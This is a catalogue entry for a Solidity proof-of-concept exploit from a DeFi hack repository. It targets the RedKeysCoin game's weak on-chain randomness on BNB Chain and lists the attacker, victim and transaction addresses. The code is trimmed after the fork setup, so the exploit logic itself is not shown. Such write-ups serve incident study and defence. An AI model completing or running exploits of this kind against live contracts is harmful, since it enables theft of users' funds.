# [?] RedKeysCoin - Weak RNG

## Summary
Severity: Unknown
Chain: BNB Chain
Component: RedKeysCoin
Published: 2024-05-27
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-05/RedKeysCoin_exp.sol
Type: defi-exploit-poc

## Details
Lost: $12K

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";

import "forge-std/interfaces/IERC20.sol";

// @KeyInfo - Total Lost : $12K
// Attacker : https://bscscan.com/address/0x36a6135672035507b772279d99a9f7445f2d1601
// Attack Contract : https://bscscan.com/address/0x471038827c05c87c23e9dba5331c753337fd918b
// Vulnerable Contract : https://bscscan.com/address/0x71e3056aa4985de9f5441f079e6c74454a3c95f0
// Attack Tx : https://bscscan.com/tx/0x8d5fb97b35b830f8addcf31c8e0c6135f15bbc2163d891a3701ada0ad654d427

// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0x71e3056aa4985de9f5441f079e6c74454a3c95f0#code

// @Analysis
// Post-mortem :
// Twitter Guy : https://x.com/SlowMist_Team/status/1794975336192438494
// Hacking God :

interface IRedKeysGame {
    function playGame(uint16 choice, uint16 ratio, uint256 amount) external;
    function counter() external view returns (uint256);
}

contract RedKeysCoin is BaseTestWithBalanceLog {
    uint256 blocknumToForkFrom = 39_079_951;

    IRedKeysGame constant game = IRedKeysGame(0x71e3056aa4985de9f5441f079E6C74454A3C95f0);
    IERC20 constant coin = IERC20(0x00e62b6CCf1fe3e5E01CE07F6232d7F378518b6b);

    function setUp() public {
        vm.createSelectFork("bsc", blocknumToForkFrom);
        //Change this to the target token to get token balance of,Keep it address 0 if its ETH that is gotten at the end of the exploit
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-05/RedKeysCoin_exp.sol_
